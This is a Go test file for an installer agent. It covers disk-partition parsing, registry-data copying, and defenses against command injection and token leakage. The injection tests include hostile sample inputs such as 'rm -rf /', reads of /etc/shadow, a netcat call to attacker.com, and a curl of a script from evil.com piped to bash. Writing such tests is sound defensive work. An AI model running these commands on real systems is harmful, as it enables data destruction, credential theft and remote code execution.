		})

		It("should return error when device has no partitions", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"type": "disk",
						"size": 100000000000,
						"children": []
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "1")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("device /dev/sda has no partitions"))
		})

		It("should return error when device has null children", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": null
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "1")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("device /dev/sda has no partitions"))
		})

		It("should return error for invalid partition number", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "sda1", "type": "part", "size": 1048576}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "invalid")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("invalid partition number invalid"))
		})

		It("should return error for partition number 0", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"size": 100000000000,
						"type": "disk",
						"children": [
							{"name": "sda1", "type": "part", "size": 1048576}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "0")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("partition 0 not found on device /dev/sda"))
		})

		It("should return error for partition number higher than available partitions", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "sda",
						"type": "disk",
						"size": 100000000000,
						"children": [
							{"name": "sda1", "type": "part", "size": 1048576},
							{"name": "sda2", "type": "part", "size": 133169152}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/sda", lsblkOutput, nil)

			_, err := o.(*ops).getPartitionPathFromLsblk("/dev/sda", "5")
			Expect(err).To(HaveOccurred())
			Expect(err.Error()).To(ContainSubstring("partition 5 not found on device /dev/sda"))
		})
	})

	Context("Multiple devices in lsblk output", func() {
		It("should find the correct device when multiple devices exist", func() {
			lsblkOutput := `{
				"blockdevices": [
					{
						"name": "dm-0",
						"size": 100000000000,
						"type": "mpath",
						"children": [
							{"name": "dm-1", "type": "part", "size": 1048576},
							{"name": "dm-2", "type": "part", "size": 133169152},
							{"name": "dm-3", "type": "part", "size": 402653184},
							{"name": "dm-4", "type": "part", "size": 3272588800}
						]
					}
				]
			}`
			mockLsblkCommand("/dev/dm-0", lsblkOutput, nil)

			path, err := o.(*ops).getPartitionPathFromLsblk("/dev/dm-0", "3")
			Expect(err).ToNot(HaveOccurred())
			Expect(path).To(Equal("/dev/mapper/dm-3"))
		})
	})
})

var _ = Describe("Copy registry data", func() {
	const lsblkResultFormat = `{
   "blockdevices": [
		{
         "name": "%s",
         "size": 100000000000,
         "ro": false,
         "type": "disk",
         "mountpoints": [
             null
         ],
         "children": [
            {
               "name": "%s",
               "maj:min": "8:1",
               "rm": false,
               "size": 1048576,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:2",
               "rm": false,
               "size": 133169152,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:3",
               "rm": false,
               "size": 402653184,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            },{
               "name": "%s",
               "maj:min": "8:4",
               "rm": false,
               "size": 3272588800,
               "ro": false,
               "type": "part",
               "mountpoints": [
                   null
               ]
            }
         ]
      }
   ]
}`
	var (
		l        = logrus.New()
		ctrl     *gomock.Controller
		execMock *execute.MockExecute
		conf     *config.Config
		o        Ops
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		execMock = execute.NewMockExecute(ctrl)
		conf = &config.Config{}
		o = NewOpsWithConfig(conf, l, execMock)
	})

	mockPrivileged := func(command string, args ...string) {
		execMock.EXPECT().ExecCommandWithOptions(nil, command, args, gomock.Any()).Times(1)
	}
	// Helper function to generate correct partition names for all device types
	getPartitionName := func(deviceName, partNum string) string {
		switch {
		case strings.HasPrefix(deviceName, "nvme"):
			return fmt.Sprintf("%sp%s", deviceName, partNum)
		case strings.HasPrefix(deviceName, "mmcblk"):
			return fmt.Sprintf("%sP%s", deviceName, partNum)
		case strings.HasPrefix(deviceName, "dm-"):
			// Device mapper devices use a different numbering scheme
			// For dm-0, partitions are dm-1, dm-2, dm-3, dm-4
			baseNum, err := strconv.Atoi(deviceName[3:]) // Extract number after "dm-"
			if err != nil {
				return deviceName + partNum // fallback
			}
			partNumInt, err := strconv.Atoi(partNum)
			if err != nil {
				return deviceName + partNum // fallback
			}
			return fmt.Sprintf("dm-%d", baseNum+partNumInt)
		default:
			return fmt.Sprintf("%s%s", deviceName, partNum)
		}
	}
	formatResult := func(device string) string {
		deviceName := stripDev(device)
		return fmt.Sprintf(lsblkResultFormat, deviceName,
			getPartitionName(deviceName, "1"),
			getPartitionName(deviceName, "2"),
			getPartitionName(deviceName, "3"),
			getPartitionName(deviceName, "4"))
	}
	runTest := func(device, part4 string) {
		dataDir := "/mnt/agentdata"
		registryDataSize := 20 * 1024 * 1024 * 1024 // 20GB
		registryDataDirOnRoot := filepath.Join("/mnt/root/ostree/deploy/rhcos", registryDataDirOnDevice)

		// Mock du calls for getting registry data size
		execMock.EXPECT().ExecCommandWithOptions(nil, "du",
			[]string{"-sb", dataDir},
			gomock.Any()).Return(strconv.FormatInt(int64(registryDataSize), 10), nil).Times(1)
		// Mock lsblk calls for partition path discovery / calculateFreePercent function
		execMock.EXPECT().ExecCommandWithOptions(nil, "lsblk",
			[]string{"--bytes", "--json", device},
			gomock.Any()).Return(formatResult(device), nil).Times(2)

		mockPrivileged("mkdir", "-p", "/mnt/root")
		mockPrivileged("mount", part4, "/mnt/root")
		mockPrivileged("sh", "-c", "fsfreeze --unfreeze /mnt/root || true")
		mockPrivileged("umount", "/mnt/root")

		mockPrivileged("growpart", "--free-percent=42", device, "4")
		mockPrivileged("bash", "-c", "sed 's/threshold=[0-9]*/threshold=0/' /usr/lib/dracut/modules.d/40ignition-ostree/ignition-ostree-transposefs.sh | bash -s autosave-xfs")
		mockPrivileged("bash", "-c", "/usr/lib/dracut/modules.d/40ignition-ostree/ignition-ostree-transposefs.sh restore")
		mockPrivileged("bash", "-c", "/usr/lib/dracut/modules.d/40ignition-ostree/ignition-ostree-transposefs.sh cleanup")

		mockPrivileged("mount", part4, "/mnt/root")
		mockPrivileged("xfs_growfs", "/mnt/root")
		mockPrivileged("mkdir", "-p", registryDataDirOnRoot)

		// Mock rsync call
		execMock.EXPECT().ExecCommandWithOptions(io.Discard, "sh",
			[]string{"-c", fmt.Sprintf("rsync -ah --info=progress2 %s/ %s/", dataDir, registryDataDirOnRoot)},
			gomock.Any()).Return("", nil).Times(1)

		mockPrivileged("fsfreeze", "--freeze", "/mnt/root")
		mockPrivileged("umount", "/mnt/root")

		err := o.CopyRegistryData(io.Discard, device)
		Expect(err).ToNot(HaveOccurred())
	}
	It("Copy registry data - sda", func() {
		runTest("/dev/sda", "/dev/sda4")
	})
	It("Copy registry data - nvme", func() {
		runTest("/dev/nvme0n1", "/dev/nvme0n1p4")
	})
	It("Copy registry data - mmcblk", func() {
		runTest("/dev/mmcblk1", "/dev/mmcblk1P4")
	})
	It("Copy registry data - device mapper", func() {
		runTest("/dev/dm-0", "/dev/dm-4")
	})
})

var _ = Describe("Security: validateImageReference", func() {
	It("should accept valid image references", func() {
		validImages := []string{
			"quay.io/openshift/must-gather:latest",
			"registry.redhat.io/ocs4/ocs-must-gather-rhel8:v4.8",
			"localhost:5000/my-image:tag",
			"registry.redhat.io:443/ocs4/image:v4.8",
			"my-registry.com:8080/repo/image:latest",
			"my-registry.com/repo/image@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
			"registry.access.redhat.com/ubi9/ubi:latest@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
			"simple-image",
			"namespace/image",
		}

		for _, img := range validImages {
			err := validateImageReference(img)
			Expect(err).ToNot(HaveOccurred(), fmt.Sprintf("Valid image '%s' should be accepted", img))
		}
	})

	It("should reject image references with shell metacharacters", func() {
		injectionAttempts := []string{
			"image; rm -rf /",
			"image | cat /etc/passwd",
			"image && malicious",
			"image || echo pwned",
			"$(malicious-command)",
			"`whoami`",
			"image<script>",
			"image>output",
			"image'DROP TABLE",
			"image\"injection",
			"image\\escape",
			"image!bang",
			"image{brace}",
			"image[array]",
			"image(paren)",
			"image&background",
			"image$variable",
		}

		for _, img := range injectionAttempts {
			err := validateImageReference(img)
			Expect(err).To(HaveOccurred(), fmt.Sprintf("Malicious image '%s' should be rejected", img))
			Expect(err.Error()).To(ContainSubstring("invalid"))
		}
	})

	It("should reject image references with control characters", func() {
		invalidImages := []string{
			"image\nwith\nnewline",
			"image\rwith\rcarriage",
			"image\twith\ttab",
			"image\x00null",
		}

		for _, img := range invalidImages {
			err := validateImageReference(img)
			Expect(err).To(HaveOccurred(), fmt.Sprintf("Image with control chars '%v' should be rejected", []byte(img)))
		}
	})

	It("should reject empty image reference", func() {
		err := validateImageReference("")
		Expect(err).To(HaveOccurred())
		Expect(err.Error()).To(ContainSubstring("cannot be empty"))
	})
})

var _ = Describe("Security: GetMustGatherLogs command injection protection", func() {
	var (
		ctrl     *gomock.Controller
		mockExec *execute.MockExecute
		o        Ops
		tempDir  string
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		mockExec = execute.NewMockExecute(ctrl)
		o = NewOps(logrus.New(), mockExec)

		var err error
		tempDir, err = os.MkdirTemp("", "must-gather-test")
		Expect(err).ToNot(HaveOccurred())
	})

	AfterEach(func() {
		ctrl.Finish()
		os.RemoveAll(tempDir)
	})

	It("should reject malicious image names with command injection attempts", func() {
		maliciousImages := []string{
			"image; rm -rf /",
			"image && cat /etc/shadow",
			"image | nc attacker.com 1234",
			"$(curl http://evil.com/script.sh | bash)",
		}

		for _, img := range maliciousImages {
			_, err := o.GetMustGatherLogs(tempDir, "/tmp/kubeconfig", img)
			Expect(err).To(HaveOccurred(), fmt.Sprintf("Should reject malicious image: %s", img))
			Expect(err.Error()).To(ContainSubstring("invalid"))
		}
	})

	It("should execute oc with proper arguments for valid images", func() {
		kubeconfig := "/tmp/kubeconfig"
		image := "quay.io/openshift/must-gather:latest"

		mustGatherDir := filepath.Join(tempDir, "must-gather.local.123456")
		Expect(os.Mkdir(mustGatherDir, 0755)).To(Succeed())

		mockExec.EXPECT().ExecCommandWithOptions(
			gomock.Any(),
			"oc",
			[]string{"--kubeconfig=" + kubeconfig, "adm", "must-gather", "--image=" + image},
			gomock.Any(),
		).Return("output", nil)

		mockExec.EXPECT().ExecCommand(
			gomock.Any(),
			"tar",
			"-czf",
			filepath.Join(tempDir, MustGatherFileName),
			"-C",
			tempDir,
			"must-gather.local.123456",
		).Return("", nil)

		_, err := o.GetMustGatherLogs(tempDir, kubeconfig, image)
		Expect(err).ToNot(HaveOccurred())
	})
})

var _ = Describe("Security: UploadInstallationLogs credential protection", func() {
	var (
		ctrl       *gomock.Controller
		mockExec   *execute.MockExecute
		o          *ops
		testConfig *config.Config
	)

	BeforeEach(func() {
		ctrl = gomock.NewController(GinkgoT())
		mockExec = execute.NewMockExecute(ctrl)

		testConfig = &config.Config{
			ClusterID:            "test-cluster",
			URL:                  "http://test.com",
			PullSecretToken:      "super-secret-bearer-token-12345",
			HostID:               "test-host",
			InfraEnvID:           "test-infraenv",
			AgentImage:           "quay.io/test/agent:latest",
			SkipCertVerification: false,
		}

		o = NewOpsWithConfig(testConfig, logrus.New(), mockExec).(*ops)
	})

	AfterEach(func() {
		ctrl.Finish()
	})

	It("should pass pull-secret-token via per-command environment, not CLI argument", func() {
		mockExec.EXPECT().ExecCommandWithOptions(
			gomock.Any(),
			"podman",
			gomock.Any(),
			gomock.Any(),
			gomock.Any(),
		).DoAndReturn(func(writer io.Writer, command string, args []string, opts ...execute.CommandOption) (string, error) {
			argsString := strings.Join(args, " ")
			Expect(command).To(Equal("podman"))
			Expect(argsString).ToNot(ContainSubstring(testConfig.PullSecretToken),
				"Token value should not appear in command arguments")

			Expect(argsString).To(ContainSubstring("--env PULL_SECRET_TOKEN"),
				"Should use --env flag with variable name only")

			Expect(argsString).ToNot(MatchRegexp(`(?:--env|-e)\s+PULL_SECRET_TOKEN=`),
				"Should not use --env PULL_SECRET_TOKEN=value format")

			Expect(argsString).ToNot(ContainSubstring("-pull-secret-token"),
				"Should not use -pull-secret-token CLI argument")

			Expect(opts).To(HaveLen(2), "Should have WithPrivilege and WithEnv options")

			return "", nil
		})

		_, err := o.UploadInstallationLogs(false)
		Expect(err).ToNot(HaveOccurred())
	})
})
